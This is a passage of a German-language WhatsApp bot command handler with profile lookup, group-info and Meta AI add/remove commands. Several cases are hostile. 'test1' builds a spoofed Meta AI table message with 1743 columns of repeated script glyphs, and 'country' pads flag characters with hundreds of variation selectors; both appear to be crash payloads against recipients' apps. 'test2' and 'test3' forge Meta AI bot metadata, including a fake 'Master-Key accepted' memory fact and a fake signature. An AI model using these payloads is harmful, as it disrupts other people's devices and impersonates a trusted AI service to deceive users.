const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.freshMappedUser || 'freshMappedUser'}`, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser'}`, `${buuUserPath}/${conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}`, `${buuUserPath}/${conf.rejectOnlyUser || 'rejectOnlyUser'}` ];
let foundPath = null;
let currentFolder = 'Wurzelverzeichnis'; // ? wtf
for (const dir of checkPaths) {
const files = await fs2.readdir(dir).catch(() => []);
const match = files.find(f => f.endsWith('.json') && f.includes(cleanId));
if (match) { foundPath = `${dir}/${match}`;
currentFolder = dir.split('/').pop();
break;
} } if (!foundPath) { await sock.sendMessage(from, { text: `❌ *Fehler:* Kein System-Profil für dich im System gefunden.` }, { quoted: msg });
} else { const rawData = await fs2.readFile(foundPath, 'utf-8');
const profile = JSON.parse(rawData);
const dsgvoState = profile.status?.dsgvo?.accepted ? '✅ Akzeptiert' : (profile.status?.dsgvo?.rejected ? '❌ Abgelehnt' : '⏳ Offen');
const verifyState = profile.status?.verified ? '✅ Verifiziert' : '⏳ Unverifiziert';
const output = `> 👤 *DEIN SYSTEM-PROFIL* 🫟\n\n` +
`• *BID:* \`${profile.identity?.bid}\`\n` +
`• *Nummer:* ${profile.identity?.phone || idk}\n` +
`• *JID:* \`${profile.identity?.jid}\`\n` +
`• *LID:* \`${profile.identity?.lid}\`\n\n` +
`> 🔐 *OOO SYSTEM-STATUS:*\n` +
`• *DSGVO:* ${dsgvoState}\n` +
`• *Verify-Stand:* ${verifyState}\n(unverify: \`${profile.status?.unverify}\`)\n` +
`• *Level: ${profile.progression?.level}\nPrestige ${profile.progression?.prestige}\n` +
`• *Wallet:*\nCopper:${profile.wallet?.copper}🤎\nSilver:${profile.wallet?.silver}🩶\nGold:${profile.wallet?.gold}💛\nPlatin:${profile.wallet?.platin}🩵\n\n` +
`> 📂 *DATEI-DETAILS:*\n` +
`• *Ordner-System:* \`${currentFolder}\`\n` +
`• *Zugeordnet am:* \`${profile.status?.mappedAt}\``;
await sock.sendMessage(from, { text: output }, { quoted: msg });
} } catch (err) { console.error(`${c.red}[Me-Cmd Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `❌ Fehler beim Auslesen deines System-Profils.` }, { quoted: msg });
} break;
}

case 'you': {
let isAuthorized = isHost;
if (!isAuthorized && isGroup) { try { const groupMetadata = await sock.groupMetadata(from);
const senderId = msg.key.participant || msg.key.remoteJid;
const senderCleanId = senderId.split('@')[0];
const participant = groupMetadata.participants.find(p => p.id.split('@')[0] === senderCleanId);
const isAdmin = participant?.admin === 'admin' || participant?.admin === 'superadmin';
if (isAdmin) { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}` ];
for (const dir of checkPaths) { const files = await fs2.readdir(dir).catch(() => []);
if (files.some(f => f.endsWith('.json') && f.includes(senderCleanId))) {
isAuthorized = true; 
break;
} } } } catch (err) { console.error(`${c.red}[You-Auth-Fehler]${c.reset}`, err);
} } if (!isAuthorized) { await sock.sendMessage(from, { text: `❌ *Zugriff verweigert:*\nDieser Befehl ist nur für den Host oder verifizierte System-Admins erlaubt.` }, { quoted: msg });
} else { let targetJid = messageContent.extendedTextMessage?.contextInfo?.participant;
if (!targetJid && args[0]) { const cleanArg = args[0].replace('@s.whatsapp.net', '').replace('@lid', '').trim();
targetJid = args[0].endsWith('@lid') ? `${cleanArg}@lid` : `${cleanArg}@s.whatsapp.net`;
} if (!targetJid) { await sock.sendMessage(from, { text: `⚠️ *Format:* Zitiere die Nachricht eines Users oder gib seine ID an:\n\`${pref}you [ID/Mention]\`` }, { quoted: msg });
} else { const cleanId = targetJid.split('@')[0];
try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.freshMappedUser || 'freshMappedUser'}`, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser'}`, `${buuUserPath}/${conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}`, `${buuUserPath}/${conf.rejectOnlyUser || 'rejectOnlyUser'}` ];
let foundPath = null;
let currentFolder = 'Wurzelverzeichnis'; // wtf !?
for (const dir of checkPaths) { const files = await fs2.readdir(dir).catch(() => []);
const match = files.find(f => f.endsWith('.json') && f.includes(cleanId));
if (match) { foundPath = `${dir}/${match}`;
currentFolder = dir.split('/').pop();
break;
} } if (!foundPath) { await sock.sendMessage(from, { text: `❌ *Fehler:* Kein System-Profil für \`${cleanId}\` in den Ordnern gefunden.` }, { quoted: msg });
} else { const rawData = await fs2.readFile(foundPath, 'utf-8');
const profile = JSON.parse(rawData);
const dsgvoState = profile.status?.dsgvo?.accepted ? '✅ Akzeptiert' : (profile.status?.dsgvo?.rejected ? '❌ Abgelehnt' : '⏳ Offen');
const verifyState = profile.status?.verified ? '✅ Verifiziert' : '⏳ Unverifiziert';
const output = `> 🔍 *SYSTEM-ABFRAGE FÜR USER* 🫟\n\n` +
`• *BID:* \`${profile.identity?.bid}\`\n` +
`• *Nummer:* ${profile.identity?.phone || idk}\n` +
`• *JID:* \`${profile.identity?.jid}\`\n` +
`• *LID:* \`${profile.identity?.lid}\`\n\n` +
`> 🔐 *STATUS-DETAILS (ADMIN-ANSICHT):*\n` +
`• *DSGVO:* ${dsgvoState}\n` +
`• *Verify-Stand:* ${verifyState}\n(unverify: \`${profile.status?.unverify}\`)\n` +
`• *Level:* ${profile.progression?.level}\n(XP: ${profile.progression?.xp}/${profile.progression?.neededXpForLvOrPrestigeUp})\n` +
`• *Wallet:*\nCopper:${profile.wallet?.copper}🤎\nSilver:${profile.wallet?.silver}🩶\nGold:${profile.wallet?.gold}💛\nPlatin:${profile.wallet?.platin}🩵\n` +
`• *Bank:* Aktiv: \`${profile.bank?.active}\`\nCopper:${profile.bank?.copper}🤎\nSilver:${profile.bank?.silver}🩶\nGold:${profile.bank?.gold}💛\nPlatin:${profile.bank?.platin}🩵\n\n` +
`> 📂 *OOO STORAGE-INFOS:*\n` +
`• *Ordner-Ort:* \`${currentFolder}\`\n` +
`• *Pfad:* \`${foundPath}\``;
await sock.sendMessage(from, { text: output }, { quoted: msg });
} } catch (err) { console.error(`${c.red}[You-Cmd Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `❌ Fehler beim Abrufen des fremden Profils.` }, { quoted: msg });
} } } break;
}

case 'test1': {
const colCount = 1743;
const rowCount = 5;
const cellPlaceholder = "ꦾꦾꦾꦾꦾ";
const headerPlaceholder = "ᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼᬼ";
const headerCells = Array.from({ length: colCount }, (_, i) => `${headerPlaceholder}`);
const dataCells = Array.from({ length: rowCount }, () => { return Array.from({ length: colCount }, () => cellPlaceholder);
});
const primitiveRows = [ { "is_header": true, "cells": headerCells }, ...dataCells.map((cells) => ({ "is_header": false, "cells": cells })) ];
const metadataRows = [ { "items": headerCells, "isHeading": true }, ...dataCells.map((cells) => ({ "items": cells })) ];
const unifiedObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": primitiveRows, "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(unifiedObj)).toString('base64');
const buuTableJson = { "messageContextInfo": { "botMetadata": { "modelMetadata": {}, "progressIndicatorMetadata": {}, "imagineMetadata": {}, "memoryMetadata": {}, "richResponseSourcesMetadata": {}, "botAgeCollectionMetadata": {}, "unifiedResponseMutation": {}} }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": metadataRows, "title": `${buuClient}` } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "pairedMediaType": "NOT_PAIRED_MEDIA", "forwardOrigin": "META_AI", "botMessageSharingInfo": { "botEntryPointOrigin": "FAVICON", "forwardScore": 743 } } } } } };
await sendJson(from, buuTableJson, { quoted: msg });
} break;

case 'test2': { const allCapabilities = Array.from({ length: 49 }, (_, i) => i + 1);
const botMetadata = { "personaId": "BUU_SYSTEM_CORE_MASTER", "modelMetadata": { "modelType": 2, "premiumModelStatus": 1 }, "capabilityMetadata": { "capabilities": allCapabilities }, "progressIndicatorMetadata": { "progressDescription": "System-Init & Optimierung", "stepsMetadata": [ { "statusTitle": "Node-Sync", "statusBody": "1743 Nodes ready.", "status": 3 }, { "statusTitle": "Kernel-Level", "statusBody": "Quantum-Reasoning active.", "status": 3 } ] }, "memoryMetadata": { "addedFacts": [{ "fact": "Master-Key accepted.", "factId": "auth_001" }], "disclaimer": "BUU Global Memory active." }, "botMetricsMetadata": { "destinationId": "BUU_CORE", "destinationEntryPoint": 1, "threadOrigin": 1 }, "botModeSelectionMetadata": { "mode": [1] }, "botQuotaMetadata": {
"botFeatureQuotaMetadata": [{ "featureType": 1, "remainingQuota": 9999 }] }, "verificationMetadata": { "proofs": [{ "version": 1, "useCase": 1, "signature": Buffer.from("BUU_SIGNATURE_DATA") }] }, "sessionTransparencyMetadata": { "isSessionTransparent": true } };
const headerCells = Array.from({ length: 5 }, () => "🫟BUU🫟");
const metadataRows = [ { "items": ["Key", "Status", "Load", "Mode", "Sync"], "isHeading": true }, { "items": ["CORE", "ONLINE", "100%", "MASTER", "OK"], "isHeading": false }, { "items": ["MEMORY", "ACTIVE", "0.01ms", "REASONING", "SYNCED"], "isHeading": false } ];
const unifiedObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": [], "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(unifiedObj)).toString('base64');
const buuTableJson = { "messageContextInfo": { "botMetadata": botMetadata }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": metadataRows, "title": buuClient } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "forwardOrigin": "META_AI" } } } } };
await sendJson(from, buuTableJson, { quoted: msg });
} break;

case 'test3': {
const metadataRows = [ { "items": ["Key", "Status", "Load", "Mode", "Sync"], "isHeading": true }, { "items": ["CORE", "ONLINE", "100%", "MASTER", "OK"], "isHeading": false }, { "items": ["MEMORY", "ACTIVE", "0.01ms", "REASONING", "SYNCED"], "isHeading": false } ];
const unifiedObj = { "response_id": buuMsgId, "sections": [{ "view_model": { "primitive": { "rows": [], "__typename": "GenATableUXPrimitive" }, "__typename": "GenAISingleLayoutViewModel" } }] };
const base64Data = Buffer.from(JSON.stringify(unifiedObj)).toString('base64');
const payload = { "messageContextInfo": { "botMetadata": { "modelMetadata": { "modelType": 1, "premiumModelStatus": 1 }, "progressIndicatorMetadata": { "progressDescription": "System-Init & Optimierung", "stepsMetadata": [ { "statusTitle": "Node-Sync", "statusBody": "1743 Nodes ready.", "status": 3 }, { "statusTitle": "Kernel-Level", "statusBody": "Quantum-Reasoning active.", "status": 3 } ] }, "memoryMetadata": { "addedFacts": [{ "fact": "Master-Key accepted.", "factId": "auth_001" }], "disclaimer": "BUU Global Memory active." } } }, "botForwardedMessage": { "message": { "richResponseMessage": { "messageType": "AI_RICH_RESPONSE_TYPE_STANDARD", "submessages": [{ "messageType": "AI_RICH_RESPONSE_TABLE", "tableMetadata": { "rows": metadataRows, "title": buuClient } }], "unifiedResponse": { "data": base64Data }, "contextInfo": { "forwardingScore": 743, "isForwarded": true, "forwardedAiBotMessageInfo": { "botJid": "867051314767696@bot" }, "forwardOrigin": "META_AI" } } } } };
await sock.sendJson(from, payload, { quoted: msg });
} break;

case 'g': case 'group': {
const perm = "- Permissions: "; 
const noPerm = `${perm}❌`;
const havePerm = `${perm}✅`;
const oldOwner = "Ehmaliger Ersteller 🤡";
const groupRankv1 = `Member ☺️\n${noPerm}`;
const groupRankv2 = `${oldOwner}\n${noPerm}`;
const groupRankv3 = `${oldOwner}\n${havePerm}`; 
const groupRankv4 = `Admin ⚜️\n${havePerm}`;
const groupRankv5 = `Ersteller 👑\n${havePerm}`;
const onlyGroup = `❌ *Fehler:*\nDieser Befehl kann nur in Gruppen verwendet werden.`;
const mentionBug = `❌ *Fehler:*\nbeim Ausführen des Gruppen-Mentions.`;
const fileError = `${c.bgRed}${c.black}[Mapping-Fehler]${c.reset}${c.red}Fehler beim Suchen im${c.reset} ${c.bgRed}${c.black}${conf.sessionUserBidPath}${c.reset}${c.red} Ordner:${c.reset}\n`;
const caseError = `${c.bgRed}${c.black}[g-Fehler]${c.reset}\n`;
if (!isGroup) { await sock.sendMessage(from, { text: onlyGroup }, { quoted: msg });
} else { try { const groupMetadata = await sock.groupMetadata(from);
const groupJid = groupMetadata.id;
const groupSubject = groupMetadata.subject;
const groupDesc = groupMetadata.desc || idk;
const senderId = msg.key.participant || msg.key.remoteJid;
const userCleanLid = senderId ? senderId.split('@')[0] : "";
let userCleanJid = userCleanLid;
if (senderId && senderId.endsWith('@lid')) { try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const files = await fs2.readdir(buuUserPath).catch(() => []);
for (const file of files) { if (file.endsWith('.json') && file.includes(userCleanLid)) { const rawData = await fs2.readFile(`${buuUserPath}/${file}`, 'utf-8');
if (rawData.trim()) { const profile = JSON.parse(rawData);
if (profile?.identity?.cleanJid) { userCleanJid = profile.identity.cleanJid;
break;
} } } } } catch (mapErr) { console.error(fileError, mapErr);
} } const groupOwnerId = groupMetadata.owner ? groupMetadata.owner.split('@')[0] : null;
const participant = groupMetadata.participants.find(p => { const pId = p.id.split('@')[0];
return pId === userCleanLid || pId === userCleanJid;
});
let userRole = groupRankv1;
if (participant) { if (participant.admin === 'superadmin') { userRole = groupRankv5;
} else if (userCleanLid === groupOwnerId || userCleanJid === groupOwnerId) { userRole = groupRankv2;
} else if (participant.admin === 'admin') { userRole = groupRankv4;
} } const output = `> 👥 GRUPPEN-INFO:\n- Name:\n${groupSubject}\n- JID:\n@${groupJid}\n> Beschreibung:\n${groupDesc}\n\n> 👤 USER-INFO:\n- MENTION:\n@${userCleanLid}\n- JID:\n\`${userCleanJid}@s.whatsapp.net\`\n- LID:\n\`${userCleanLid}@lid\`\n- ✨Rang:\n*${userRole}*`;
await sock.sendJson(from, { "extendedTextMessage": { "text": output, "contextInfo": { "mentionedJid": [ `${userCleanLid}@lid`, `${userCleanJid}@s.whatsapp.net` ], "groupMentions": [ { "groupJid": groupJid, "groupSubject": groupSubject } ] } } });
} catch (err) { console.error(caseError, err);
await sock.sendMessage(from, { text: mentionBug }, { quoted: msg });
} } break;
}

case 'addmeta': { if (isGroup) { try { await sock.groupParticipantsUpdate(from, ['867051314767696@bot'], 'add');
} catch (error) { console.error(error);
} } break;
}

case 'kickmeta': { if (isGroup) { try { await sock.groupParticipantsUpdate(from, ['867051314767696@bot'], 'remove');
} catch (error) { console.error(error);
} } break;
}

case 'country': { const d = "🇩";
const e = "🇪";
const s = "🇸";
const vS16 = "\uFE0F";
let deRepeatCount = 668; 
let esRepeatCount = 97;  
let xyz = vS16.repeat(deRepeatCount);
let zyx = vS16.repeat(esRepeatCount);
let flags = `${d}${xyz}${e}${zyx}${s}`;
await sock.sendMessage(from, { text: flags }, { quoted: msg });
break;
}


default: console.log(`${unknownCmd}`);
break;
} } catch (err) { console.error(`${msgHandlerError}\n`, err);
} }